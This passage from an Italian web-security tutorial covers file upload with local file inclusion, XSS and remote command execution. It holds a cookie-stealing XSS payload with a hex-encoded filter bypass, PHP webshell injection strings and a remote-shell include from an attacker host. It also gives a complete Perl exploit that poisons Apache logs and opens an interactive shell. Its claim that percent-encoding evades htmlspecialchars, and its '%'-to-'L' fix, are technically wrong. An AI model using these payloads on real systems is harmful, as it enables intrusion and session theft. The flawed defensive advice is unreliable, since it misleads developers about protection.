Come si può notare, nell'array `$ext_denied` sono poste le estensioni non consentite, e se il file che l'utente vuole caricare ha un'estensione non consentita l'upload verrà terminato dall'`exit`.

Se ci fossero altri eventuali controlli, che non permetterebbero la rinomina del file dopo l'upload, allora per eseguire il codice php contenuto nel file che rimarrà `.gif`, avremo bisogno di una Local File Inclusion.

Poiché come è stato detto, vi sono controlli ancora più minuziosi, e non è possibile cambiare il nome del file da `img.gif` a `img.php`, troveremo la nostra immagine al link `http://sito.it/uploads/img.gif`

Non essendo un file `.php`, non verrà eseguito il codice al suo interno. Abbiamo dunque bisogno di sfruttare un include locale vulnerabile, per includere così `img.gif`, ed eseguire il codice php al suo interno.



# Vulnerabilità di tipo Cross Site Scripting (XSS)
Da wikipedia:
>Il Cross-site scripting (XSS) è una vulnerabilità che affligge siti web dinamici che impiegano un insufficiente controllo dell'input (parametri di richieste HTTP GET o contenuto di richieste HTTP POST). Un XSS permette ad un attaccante di inserire codice al fine di modificare il contenuto della pagina web visitata. In questo modo sì potranno sottrarre dati sensibili presenti nel browser degli utenti che visiteranno successivamente quella pagina. Gli attacchi alle vulnerabilità XSS hanno effetti dirompenti in siti con un elevato numero di utenti, dato che è sufficiente una sola compromissione per colpire chiunque visiti la stessa pagina.

L'XSS è una vulnerabilità dunque che può essere molto dannosa o meno. Una XSS può essere di due tipi: permanent, e reflected.

## Permanent Cross-Site Scripting

Andiamo a vedere meglio cosa sia, con qualche esempio pratico. Vi mostrerò una vulnerabilità di tipo XSS che io stesso trovai su una Web App:

```php
//code
    $quote = $_REQUEST['quote'];
    $writePage = fopen('quotes.txt', 'a') or die("can't open file");
  fwrite($writePage, "\t");
    fwrite($writePage, stripslashes($quote));
    fclose($writePage);
//code
```

Come possiamo vedere, in questa pagina era possibile inserire senza nessun problema codice malevolo, in quanto questo veniva salvato su un file di testo (.txt).

Vediamo ora quest'altra pagina:

*page.php*
```php
    $quotes = file_get_contents("quotes.txt");
    $quotes= preg_split("/[\t]+/", $quotes);
    $i = 0;
    $noQuotes = sizeOf($quotes);
    while ($i < $noQuotes)
    {
        $quote = $quotes[$i];
        echo '<option value='.$i.'>'.$quote.'</option>';
        $i = $i + 1;
    }
//code
```

Come possiamo vedere, questa pagina prende il contenuto del file di testo (quello di prima per intenderci), e lo stampa direttamente nell'HTML senza fare alcun check. Ci troviamo di fronte a una XSS di tipo Permanent, in quanto ogni volta che si clicca su quella pagina, questa prenderà il contenuto dal file di testo e lo stamperà a schermo. E se nel file di testo un attacker ci avesse piazzato un codice javascript?

## Reflected Cross-Site Scripting
Vediamo ora un esempio di XSS di tipo reflected:

*page1.php*
```php
$lol = $_GET[lol];
//code
echo "$lol<br>";
//code
```

Questa XSS è di tipo reflected in quanto non rimane memorizzata in modo che qualsiasi utente apra la pagina veda l'effetto delal nostra iniezione di codice javascript, ma la vede solamente l'utente che la effettua, cerchiamo di capire meglio:

`GET sito.it/page1.php?lol=<script>alert("XSS")</script>`

Facendo una richiesta di questo tipo, ci apparirà l'alert, ma questo apparirà solo con un url di questo tipo. La differenza tra permanent e reflected sta nel fatto che mentre quella permament verrà visualizzata da tutti, quella refelcetd verrà vista solo da chi comporrà un url di questo tipo. Una xss di tipo reflected è molto più limitata dunque.

Torniamo al caso della XSS di tipo permanent, e vediamo come poterla sfruttare al meglio.

Poniamo il caso in cui l'attacker da GET avesse inserito: `<script>alert("XSS")</script>` nel file di testo. Ogni qualvolta un utente poi avrebbe cliccato su page.php, questa sarebeb andata a prendere il contenuto dal file di testo, avrebbe dunque stampato a schermo: `<script>alert("XSS")</script>`, che produce un fastidioso alert con scritto " XSS ". Fino a qui, la vulnerabilità è più che altro fastidiosa, ma non dannosa in quanto compromettente.

E se invece l'XSS venisse usate per rubare dati sensibili all'utente, magari i suoi cookies?

## Exploiting XSS con Token Stealing

La proprietà document.cookie del Javascript permette di prendere i cookie dell'utente.

La proprietà windows.location invece reindirizza l'utente a un secondo sito.

Per rubare i cookie della vittima sfruttando una XSS, dobbiamo prima di tutto avere un file .php con la proprietà di salvare ciò che gli viene inviato da GET su un file di testo.

*log.php*
```php
<html>
   <head>
   <title>404 Not Found</title>
   </head>
   <body>
   <h1>Not Found</h1>
   <?php
   $data = $_GET[data];
   $fh = fopen("cookies.txt",'a+');
   fwrite($fh, "$data");
   fclose($fh);
   ?>
   <p>The requested URL was not found on this server.</p>
   </body>
</html>
```

Un file di questo tipo, prende il valore che diamo a data da GET e lo salva in `cookies.txt`.
Se avessimo inserito una XSS di questo tipo?

`<script> window.location="http://sito.it/log.php?cookie="+document.cookie </script>`

Ciò causerebbe che l'utente, non appena avrebbe caricato la pagina, verrebbe reindirizzato alla pagina log.php presente su sito.it, ponendo i suoi cookie (presi da `document.cookie`) come valore di data.
Quindi i cookie della vittima verrebbero salvati sul file di testo cookies.txt

Ecco quindi L'XSS sfruttata. La tecnica appena analizzata si chiama Cookie Stealing, "furto di cookie", perchè ha forzato l'utente a visitare quel sito a causa del redirect, rubandogli poi sucessivamente i cookie.

I cookie sono importanti, perchè in molte applicazioni il cheek e il login avviene anche solo grazie ai Cookie. Mettiamo caso che una applicazione, quando un utente si logga correttamente, imposta su di lui un cookie con contenuto la password ad esempio. Una tacco di tipo Cookie Handling non potrebbe essere effettuato, perchè appunto la password dell'utente è segreta all'attacker, ma con una XSS il sistema diventa vulenrabile. Grazia alla tecnica del cookie stealing, l'attacker verrebbe a consocenza dei cookie della vittima, e bastarebbe poi loggarsi con quei cookie per accedere con le credenziali dell'utente malcapitato. In questo caso, se la passoword non era criptata, si poteva direttamente usare quella per il login.

Molte volte ci sono dei filtri, che "bloccano" le XSS, ecco delle specie di bypass:
```
%3C%73%63%72%69%70%74%3E%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F
%6E%3D%22%68%74%74%70%3A%2F%2F%73%69%74%6F%2E%69%74%2F%6C%6F%67%2E%70
%68%70%3F%63%6F%6F%6B%69%65%3D%22%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F
%6F%6B%69%65%20%3C%2F%73%63%72%69%70%74%3E 
```
Questa stringa apparentemente incomprensibile, altro non è che : 
```
<script> window.location="http://sito.it/log.php?cookie="+document.cookie </script> 
```
convertita in HEX. Se dunque ci fosse una specie di protezione per le XSS, che facesse un check per il tag `<script> ..` bastrebbe convertire l'XSS in HEX per bypassare il controllo.

## Prevenzione

Per prevenire una XSS bastarebbe un cheek, cioè un controllo sui dati provenienti dall'utente. Potrebbe essere sufficente controlalre che l'utente non inserisca `<script>`, ma come abbiamo visto si può evadare un cotnrollo di questo tipo scrivendo una xss criptata in HEX.
Una funzione che può essere utile, per bloccare una xss, è `htmlspecialchars().`

Carattere originale | Carattere Convertito
--- | --- 
`&` (ampersand) | `&amp;`
`"` (double quote) | `&quot;` when ENT_NOQUOTES is not set.
`'` (single quote) | `&#039;` only when ENT_QUOTES is set.
`<` (less than) | `&lt;`
`>` (greater than) | `&gt;`

Ecco come agisce questa funzione.

Ma anche questa funzione potrebbe venire bypassata scrivendo una XSS in HEX. La cosa migliore sarebbe quella di controllare la presenza di `%` nella variabile, in tal caso sostituirli, e poi applicarla alla funzione `htmlspecialchars()`.
Come?

*secure.php*
```php
$var = $_GET[var];

$var = str_replace("%", "L", $var);

$var = htmlspecialchars($var);

//code
```

Con un codice del genere, innanzitutto i caratteri di `%` in `$var` verrebbero sostituiti con il carattere `L` (preso a caso, si poteva mettere qualsiasi cosa), poi `$var` veniva applicata a `htmlspecialchars`, che avrebeb convertito `& " ' < >` con i corrispettivi caratteri.

In questo modo, il bypass usando l'HEX non poteva avvenire, poichè una xss così:
```
%3C%73%63%72%69%70%74%3E%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F
%6E%3D%22%68%74%74%70%3A%2F%2F%73%69%74%6F%2E%69%74%2F%6C%6F%67%2E%70
%68%70%3F%63%6F%6F%6B%69%65%3D%22%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F
%6F%6B%69%65%20%3C%2F%73%63%72%69%70%74%3E 
```
Sarebbe diventata così:
```
L3CL73L63L72L69L70L74L3EL20L77L69L6EL64L6FL77L2EL6CL6FL63L61L74L69L6F
L6EL3DL22L68L74L74L70L3AL2FL2FL73L69L74L6FL2EL69L74L2FL6CL6FL67L2EL70
L68L70L3FL63L6FL6FL6BL69L65L3DL22L2BL64L6FL63L75L6DL65L6EL74L2EL63L6F
L6FL6BL69L65L20L3CL2FL73L63L72L69L70L74L3E
```
Questi sono solo alcuni fra i modi per bloccare le xss.

Alternativamente, possiamo usare la funzione `strip_tags()` che, radicalmente, rimuove tutti i tag HTML e PHP da una stringa.

Se si vuole, invece, dare la possibilità di usare codice JavaScript all'interno dell'applicazione Web, occorre usare delle "whitelist" (lista delle stringhe ammissibili), ovvero definire a priori quali stringhe innocue possiamo accettare, e scartare le rimanenti.




# Remote Command Execution (RCE)

Questo tipo di vulnerabilità è molto grave, in quanto sfruttandola si potrà eseguire codice arbitrario sul server vittima.
Userò ora l'acronimo RCE per chiamare tale vulnerabilità. Una RCE a differenza di una RFI e/o LFI nella maggior parte delle volte non è di facile individuazione, è quel tipo di bug che per la maggior parte dei casi richiede un pò di ingegno per essere sfruttato.

La base di una RCE si fonda su un codice php scritto in modo tale che dati provenienti direttamente da input dell'utente vengano eseguiti sul server remoto grazie a delle funzioni che php mette a disposizione. Le funzioni che svolgono questo compito sono molteplici, ora le riporto:

`system()`, `eval()`, `exec()`, `shell_exec()` e `passthru()`.

## Analisi di codice

### Caso "Diretto" di RCE

```php
<?php
// code
$var = $_GET['cmd'];
system($var);
// code
?>
```

In questo spezzone di codice è possibile vedere come una variabile proveniente da GET e non filtrata venga eseguita sul server grazie alla funzione `system()`. Questo è il concetto su cui si base una vulnerabilità di tipo Remote Command Execution.

Ormai le conoscenze in ambito di sicurezza si sono diffuse, e sarà molto difficile trovare codici di questo tipo.
Come ho già detto, una RCE solitamente è il prodotto di varie vulnerabilità associate e combinate. Il principio su cui si basa è sempre lo stesso, ma il modo di arrivarci cambia.

Per capire e sapere trovare un RCE, è richiesto un minimo di ingegno, e di conoscenze nell' ambito sicurezza web.
Una semplice RFI può essere considerata ad esempio una RCE, in quanto tramite questa è possibile eseguire comandi arbitrari sul server.
Una banale LFI, si può trasformare in una RCE mediante la tecnica del log poisoning.
Ad ogni modo, una LFI e una RFI rimangono sempre LFI e RFI, e non vengono ritenute delle vere e proprie RCE.
Diciamo pure che l'unico caso in qui un codice sia direttamente vulnerabile a RCE è quello di sopra riportato, dove un variabile proveniente direttamente da GET/POST o non dichiarata viene eseguita sul server.

Analizziamo ora i vari casi, in cui, sfruttando certi bug e combinando varie tecniche si arriverà alla Remote Command Execution.

### Casi "Indiretti" di RCE

#### Possibilità di scrittura di codice arbitrario su file .php

Se analizzando uno script PHP ci si rende conto che certe variabili provenienti direttamente da GET/POST vengono salvate in un file `.php`, allora vuol dire che ci troviamo di fronte a una possibile RCE.
Poichè noi possiamo assegnare valore arbitrario a delle variabili, valore che verrà poi salvato in un file `.php`, allora ci troviamo di fronte a una pericolosissima vulnerabilità, in quanto saremo liberi di scrivere tutto ciò che vorremo su un file .php, codice che verrà eseguito.
Volendo si potrebbe scrivere codice vulnerabile a RCE, a RFI e così via dicendo. Si potrebbe rendere il server vulnerabile ad ogni tipo di bug esistente, per poi sfruttare questi bug da noi creati per il nostro scopo.
Nella maggior parte dei casi si sceglie di scrivere codice vulnerabile a RCE, in quanto da RCE si può fare di tutto.
Analizziamo ora un codice vulnerabile a questo tipo di vulnerabilità.

```php
<?php
// code
$file = "data.php";
$var = $_GET['var'];
fopen($file,"w") or err(0);
fwrite($file, $var);
fclose($file);
// code
?>
```

Questo è un semplice esempio, solitamente non si troverà codice così, ma il principio di base è sempre lo stesso.
Dunque è possibile scrivere codice arbitrario su `data.php`, renderlo vulnerabile e sfruttare poi il bug creato.

#### Possibilità di scrittura di codice aritrario su file .txt e conpresenza di LFI

Nel caso precedente abbiamo analizzato come si possa giungere a una RCE avendo la possibilità di scrivere codice arbitrario su file `.php`.
Ma ora, ci troviamo di fronte ad un ostacolo: possiamo scrivere codice su file con estensione di testo (`.txt`), quindi il codice contenuto non verrà eseguito, avremmo dunque bisogno che il cms o lo script sia vulnerabile a LFI, così potremmo includere un file locale (il file `.txt`) il quale codice verrà eseguito proprio grazie all'include o require vulnerabile.

*file1.php*
```php
<?php
//data
$var = $_GET['var'];
require("/$var/lol/c.php");
//code
?>
```

*file2.php*
```php

<?php
// code
$file = "data.txt";
$var = $_GET['var'];
fopen($file,"w") or err(0);
fwrite($file, $var);
fclose($file);
// code
?>
```

Come si può vedere `file1.php` è vulnerabile  Local File Inclusion. Il file `file2.php` permette invece di scrivere codice arbitrario nel file `data.txt`.
Scrivendo codice php vulnerabile, e sfruttando poi la LFI per includere il file locale vulnerabile. L'attacco verrà descritto nella apposita sezione. 


#### RCE tramite RFI

Poichè quando siamo in presenza di una Remote File Inclusion è possibile includere un file esterno al server, file il cui codice verrà poi eseguito, basta includere un file php soggetto a RCE, per eseguire comandi arbitrari sul server vittima.

```php
<?php
include($var."/lol/c.php");
?>
```

Un esempio di RFI, nella prossima sezione l'attacco verrà descritto.

#### RCE tramite LFI (Log Poisoning)

Si può giungere a una RCE facilmente grazie a una Local File Inclusion e un exploit appositamente creato.
Ormai dovreste essere in grado di trovare senza difficoltà una LFI, ad ogni modo vi rinfresco la memoria.

```php
<?php
$var = $_GET['var'];
include("/ciao/$var.php");
?>
```

A livello di codice basta quindi trovare una LFI, l'exploit per il log poisoning verrà illustrato nella sezione attacco.

## Sfruttare la falla

In questa sezione verranno illustrate le varie tecniche di attacco per sfruttare una RCE, e anche gli exploit più usati.

### Caso "Diretto" di RCE

*rce.php*
```php
<?php
// code
$var = $_GET['cmd'];
system($var);
// code
?>
```

In questo file si nota come venga eseguita grazie alla funzione system una varibile il cui contenuto proviene da GET.
L'exploiting sarà piuttosto banale. Facciam finta che `rce.php` si trovi in `/pub/`:
`http://sitovittima.it/pub/rce.php?cmd=COMANDO_DA_ESEGUIRE`
ES: `http://sitovittima.it/pub/rce.php?cmd=pwd`

Analizziamo sempre un caso simile, con la differenza che la variabile non sia dichiarata.

*rce.php*
```php
<?php
// code
system($var);
// code
?>
```

L'exploit avverà in questo modo:

`http://sitovittima.it/pub/rce.php?var=COMANDO_DA_ESEGUIRE`
ES: `http://sitovittima.it/pub/rce.php?var=whoami`

Nel caso in cui `$var` provenga da POST, basterà inserire il comando da eseguire nel form appropriato.

### Casi "Indiretti" di RCE

#### Possibilità di scrittura di codice arbitrario su file .php

*a.php*
```php
<?php
// code
$file = "data.php";
$var = $_GET['var'];
fopen($file,"w") or err(0);
fwrite($file, $var);
fclose($file);
// code
?>
```

Variabili il cui valore viene assegnato arbitrariamente direttamente da GET/POST vengono salvate su file con estensione.php.
L'attacco è piuttosto facile: basterà assegnare come contenuto a queste var codice php vulnerabile, per poi sfruttare il bug creato.

`$var` proviene da GET, assegnamole come valore codice php vulnerabile.
`http://sito.it/a.php?var=<?php system($_GET['cmd']); ?>`

In questo modo `$var` avrà questo valore: `<?php system($_GET['cmd']); ?>`
Valore che andrà a finire nel file `data.php`. Il codice assegnato a `$var` da come sappiamo è vulnerabile a RCE.
L'attacco è quasi completo:
`http://sito.it/data.php?cmd=COMANDO_DA_ESEGUIRE`
ES: `http://sito.it/data.php?cmd=uname -a`

Riassumendo, poichè era possibile scrivere codice arbitrario su un file `.php`, bastava poi sfruttare il bug creato come si è già imparato.

#### Possibilità di scrittura di codice aritrario su file .txt e conpresenza di LFI

Poichè è possibile scrivere codice arbitrario su file `.txt`, avremmo bisogno di una Local File Inclusion per includere il fiile `.txt` con codice malevolo locale.

*file1.php*
```php
<?php
//data
$var = $_GET['var'];
require("/$var/lol/c.php");
//code
?>
```

*file2.php*
```php
<?php
// code
$file = "data.txt";
$var = $_GET['var'];
fopen($file,"w") or err(0);
fwrite($file, $var);
fclose($file);
// code
?>
```

Il File `file2.php` è analogo al caso analizzato in precedenza. Basta assegnare codice php arbitrario alla variabile `$var` in modo tale che questo venga scritto su `data.txt`. Poichè il file è `.txt`, per eseguire il codice che contiene sarà necessaria la presenza di una Local File Inclusion, che proprio andrà a caricare il file locale seguendone il codice sorgente. 

L'attacco inizierà proprio come prima, dovremmo infatti scrivere codice php malevolo all'interno di data.txt.

`$var` proviene da GET, assegnamole come valore codice php vulnerabile.
`http://sito.it/file2.php?var=<?php system($_GET['cmd']); ?>`

In questo modo `$var` avrà questo valore: `<?php system($_GET['cmd']); ?>`
Valore che andrà a finire nel file `data.txt`. Il codice assegnato a $var da come sappiamo è vulnerabile a RCE. L'attacco è quasi completo.

Poichè il file su cui abbiam scritto codice vulnerabile ha estensione `.txt` e non più `.php`, per sfruttare la vulnerabilità non potremmo più usare il file .php vulnerabile, ma ci servirà una LFI per caricare il file locale, in quanto lanciando un file .txt il codice contenuto non verrà eseguito.

Poichè sappiamo che il file vulnerabile a LFI è `file1.php`, richimiamo e includiamo il file vulnerabile in modo tale che il suo codice venga eseguito.

`http://sitovittima.it/file1.php?var=data.txt%00&cmd=COMANDO_DA_ESEGUIRE`
`http://sitovittima.it/file1.php?var=data.txt%00&cmd=pwd`

Analizziamo l'attacco:

Query  | Query spiegata 
--- | --- 
`?var=data.txt` | Con questo tramite la LFI includiamo il file su cui abiam scritto codice vulnerabile.
`%00` | Il Null Byte è necessarrio in quanto nella lfi `require("/$var/lol/c.php")` senza il `%00` verrebbe preso in considerazione anche `/lol/c.php`
`&cmd=COMANDO`  | Con questo assegnamo il comando alla variabile GET, comando che poi andrà eseguito.


#### RCE tramite RFI

Poichè lo script è vulnerabile a RFI e poichè possiam includere un qualsiasi file, creiamo un file vulnerabile a RCE.

*rfi.php*
```php
<?php
// code
include($var);
// code
?>
```

rfi.php è vulnerabile a RFI. Analizziamo lo script esterno da includere

*shell.txt*
```php
<?php
$var = $_GET['cmd'];
echo "<b>CMD: </b>";
system($var);
?>
```

Andiamo ora a includere shell.txt presente in `http://evilsite.it/`

`http://sito.it/rfi.php?var=http://evilsite.it/shell.txt&cmd=id`

Analisi dell'attacco:

Query  | Query spiegata 
--- | --- 
`rfi.php?var=` | Con questo avviamo l'inclusione, dichiarando `$var` e assegnandole come valore il sito esterno
`http://evilsite.it/shell.txt` | Questo è il link della shell esterna
`&cmd=COMANDO` | Eseguiamo comandi arbitrari 


#### RCE tramite LFI (Log Poisoning)

Se ci troviamo in presenza di Local File Inclusion, è possibile sfruttare una tecnica molto ingegnosa, arrivando a una Remote Command Execution. Ogni server sul quale sia installato php, e che quindi esegue correttamente pagine .php, deve avere un Web Server, nella maggior parte dei casi Apache.

Questo Web Server, ha innumerevoli funzioni, tra le quali il salvataggio di determinate informazioni, come i Log.
In questo caso, i Log di Apache sono dei file nei quali sono memorizzate informazioni come richieste al Web Server, errori, e via dicendo.

L'exploit che sto per descrivervi è ingegnoso, cerchrò di renderlo il più facile possibile.
Se noi effettuiamo una richiesta GET a un sito, questa verrà memorizzata nei lod di apache del web server.
Vediamo il funzionamento:

Proviamo ad effettuare una richiesta GET al nostro server locale:
`http://localhost/a.php <?php echo "Iniezione nei log"; ?>`

Nel mio caso i Log di apache hanno il seguente percorso:
`/var/log/httpd/access_log`

Andiamo ad analizzarli:
*access_log*
```
// log
127.0.0.1 - - [08/Jan/2009:00:34:00 +0100] "GET /a.php%20%3C?php%20echo%20%22Iniezione%20nei%20log%22;%20?%3E HTTP/1.1" 404 208
```

Il codice php iniettato non potrà essere eseguito, in quanto è stato convertito automaticamente dal browser (URL encode). Dovremmo fare dunque una richiesta GET non da browser, ma da Socket, o Telnet.

```
osirys[~]>$ telnet localhost 80
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
GET a.php <?php echo "Iniezione nei log"; ?> HTTP/1.1
```

Andiamo a vedere i Log:
*access_log*
```
// log
127.0.0.1 - - [08/Jan/2009:00:50:32 +0100] "GET a.php <?php echo \"Iniezione nei log\"; ?> HTTP/1.1" 400 296
```

Come si può vedere, la differenza tra l'uso del browser e l'uso di telnet/socket è enorme.
Proviamo a iniettare allora codice php malevolo che altro non farà che eseguire comandi provenienti da GET.

```
osirys[~]>$ telnet localhost 80                                       
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
GET a.php <?php system($_GET[cmd]); ?> HTTP/1.1
```

Analizziamo ora i log:
*access_log*
```
127.0.0.1 - - [08/Jan/2009:00:56:46 +0100] "GET a.php <?php system($_GET[cmd]); ?> HTTP/1.1" 400 301
```

Come si è visto, il codice php è stato scritto.
poiché usufriamo di una falla di tipo Local File Inclusion, che ricordo, oltre a caricare il file scelto, lo esegue anche, possiamo includere il file del log eseguendo così il codice php appena iniettato.

Dato che molte volte la falla di tipo LFI richiede il Null Byte alla fine del file incluso, per escludere l'inclusione di dati indesiderati, dovremmo mettere dopo il `%00` il comando da eseguire.

Facciam finta che `sito.it/a.php?lfi=` sia il percorso della LFI, vediamo il possibile attacco:
`http://sito.it/a.php?lfi=../../../../../../../../var/log/httpd/access_log%00&cmd=comando`

Query  | Query spiegata 
--- | --- 
`http://sito.it/a.php?lfi=` | Percorso della LFI
`../../../../../../../../var/log/httpd/access_log` | Percorso dei Log di Apache da includere nei quali è stato iniettato il codice php malevolo
`%00` | Null Byte, eviteremo di includere dati superflui proveniente dall'include vulnerabile
`&cmd=comando` | Assegnamo comando come valore della variabile proveniente da GET

L'exploit che ho scritto è un esempio di come si possa arrivare a una Remote Command Execution partendo da una Local File Inclusion.

*Exploit*
```perl
#!/usr/bin/perl

# ------------------------------------------------------------------
# Exploit in action [>!]
# ------------------------------------------------------------------
# osirys[~]>$ perl lfi.txt localhost /lfi.php?a=
#
#   ---------------------------------
#     RCE via Log Poisoning (LFI)
#               (Log Inj)
#               by Osirys
#   ---------------------------------
#
# [*] Injecting evil php code ..
# [*] Cheeking for Apache Logs ..
# [*] Apache Log Injection completed
# [*] Path: /var/log/httpd/access_log
# [!] Hi my master, do your job now [x]
#
# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pws
# bash: pws: command not found
# shell[localhost]$> pwd
# /home/osirys/web/
# shell[localhost]$> exit
# [-] Quitting ..
#
# osirys[~]>$
# ------------------------------------------------------------------


use IO::Socket::INET;
use LWP::UserAgent;

my $host       =  $ARGV[0];
my $lfi_path   =  $ARGV[1];
my $null_byte  =  "%00";
my $rand_a     =  int(rand 150);
my $rand1      =  "1337".$rand_a."1337";
my $rand_b     =  int(rand 150);
my $rand2      =  "1337".$rand_b."1337";
my $gotcha     =  0;
my $dir_trasv  =  "../../../../../../../../../..";
my @logs_dirs  =  qw(
                      /var/log/httpd/access_log
                      /var/log/httpd/access.log
                      /var/log/httpd/error.log
                      /var/log/httpd/error_log
                      /var/log/access_log
                      /logs/error.log
                      /logs/access.log
                      /var/log/apache/error_log
                      /var/log/apache/error.log
                      /etc/httpd/logs/access_log
                      /usr/local/apache/logs/error_log
                      /etc/httpd/logs/access.log
                      /etc/httpd/logs/error_log
                      /etc/httpd/logs/error.log
                      /usr/local/apache/logs/access_log
                      /usr/local/apache/logs/access.log
                      /var/www/logs/access_log
                      /var/www/logs/access.log
                      /var/log/apache/access_log
                      /var/log/apache/access.log
                      /var/log/access_log
                      /var/www/logs/error_log
                      /var/www/logs/error.log
                      /usr/local/apache/logs/error.log
                      /var/log/error_log
                      /apache/logs/error.log
                      /apache/logs/access.log
                    );

my $php_code   =  "<?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=st".
                  "ripslashes(\$_GET[cmd]);} system(\$_GET[cmd]);?>";

(($host)&&($lfi_path)) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);


$sock = IO::Socket::INET->new(
                                PeerAddr => $h0st,
                                PeerPort => 80,
                                Proto => "tcp"
                             ) || die "Can't connect to $host:80!\n";

print "[*] Injecting evil php code ..\n";


print $sock "GET /Osirys_log_inj start0".$rand1.$php_code."0end".$rand2." HTTP/1.1\r\n";
print $sock "Host: ".$host."\r\n";
print $sock "Connection: close\r\n\r\n";
close($sock);

print "[*] Cheeking for Apache Logs ..\n";

while (($log = <@logs_dirs>)&&($gotcha != 1)) {
    $tmp_path = $host.$lfi_path.$dir_trasv.$log.$null_byte;
    $re = get_req($tmp_path);
    if ($re =~ /Osirys_log_inj/) {
        $gotcha = 1;
        $log_path = $tmp_path;
        print "[*] Apache Log Injection completed\n";
        print "[*] Path: $log\n";
        print "[!] Hi my master, do your job now [x]\n\n";
        &exec_cmd;
    }
}

$gotcha == 1 || die "[-] Couldn't find Apache Logs\n";

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n\n";
    $exec_url = $log_path."&cmd=".$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ m/start0$rand1(.+)\*0end$rand2/g) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  --------------------------------- \n".
          "    RCE via Log Poisoning (LFI)     \n".
          "             (Log Inj)              \n".
          "             by Osirys              \n".
          "  --------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input data failed ! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 host path\n\n";
    exit(0);
}
```

Andiamo a vedere:

```
osirys[~]>$ perl lfi.txt localhost /lfi.php?a=

  ---------------------------------
     RCE via Log Poisoning (LFI)
              (Log Inj)
              by Osirys
  ---------------------------------

[*] Injecting evil php code ..
[*] Cheeking for Apache Logs ..
[*] Apache Log Injection completed
[*] Path: /var/log/httpd/access_log
[!] Hi my master, do your job now [x]

shell[localhost]$> id
uid=80(apache) gid=80(apache) groups=80(apache)
shell[localhost]$> pws
bash: pws: command not found
shell[localhost]$> pwd
/home/osirys/web/
shell[localhost]$> exit
[-] Quitting ..

osirys[~]>$
```

## Prevenzione

Dopo aver a lungo esaminato la fase dell'attacco e di individuazione di possibili RCE, è ora bene imparare a scrivere codice sicuro e difendersi da questa vulnerabilità assai pericolosa.
Come ho detto prima, il caso base di RCE è quello dove una variabile proveniente direttamente da GET/POST o non dichiarata venga eseguita grazie alle funzioni del php.

### Caso "Diretto" di RCE

rce.php
```php
<?php
// code
$var = $_GET['cmd'];
system($var);
// code
?>
```

Il caso diretto di RCE come questo, è facilmente evitaile. Basta applicare dei filtri a `$var`, in modo tale che l'utente disponga di una scelga limitata.
Se per esempio si vuole che l'utente possa eseguire solo alcuni comandi, si può utilizzare la funzione già descritta: `in_array`

*rce_sicuro.php*
```php
<?php
//code
$var = $_GET['cmd'];
$cmds = array("uname -a", "id");
if (in_array($var,$cmds)) {
    system($var);
}
else {
    echo "Command not allowed";
    die();
}
```

Da questo esempio si può capire come scrivere un codice sicuro quando si voglia che l'utente possa eseguire solo determinati comandi.
La funzione `in_array` è già stata spiegata nel capitolo prevenzione delle RFI, quindi, in caso di dimenticanza, andarsela a rivedere.

Nel caso in cui si voglia dare libera invece libera autonomia e scelta ad un utente, permettendogli di eseguire qualsiasi comando voglia, è bene creare una funzione di login, dove magari solo l'amministratore può eseguire comandi, altrimenti un qualsiasi utente potrebbe iniziare a "giocare" col vostro sito.

Ad ogni modo, molto di rado si trova codice scritto così, è pià probabile infatti trovare codice soggetto ad altri bug, vulnerabilità che poi possono sfociare in una RCE.

Riprendiamo i casi descritti primi, per capire come difendersi.

### Casi "Indiretti" di RCE
#### Possibilità di scrittura di codice arbitrario su file .php

*a.php*
```php
<?php
// code
$file = "data.php";
$var = $_GET['var'];
fopen($file,"w") or err(0);
fwrite($file, $var);
fclose($file);
// code
?>
```

In questo pezzo di sorgente è possibile scrivere codice arbitrario su un file con estensione `.php`. Nei casi in cui si vuole che dei dati vengano scritti su pagine `.php`, è bene controllare alla perfezione questi ultimi.

Nel momento in cui questi dati provengano direttamente da input dell'utente, è bene sottoporli a numerosi controlli.
Si potrebbe ad esempio utilizzare la funzioine in_array per mettere in un array le possibili scelte consentite e sicure che un utente possa fare. Ci sono innumerovili casi, e analizzarli uno a uno non è necessario.

In un cms, o in un qualunque script `.php`, è possibile che in certe pagine un utente debba inserire da POST dei dati, dati che poi verranno salvati su pagine .php. Se per esempio l'utente deve scrivere Nome e Cognome, basta fare dei controlli, che non ci siano simboli strani nel FORM, ma solo lettere. Se l'utente deve scrivere la propria mail, una buona regexp per verificare che l'utente abbia scritto una mail valida è necessarria. Insomma, basta mettere degli opportuni filtri.


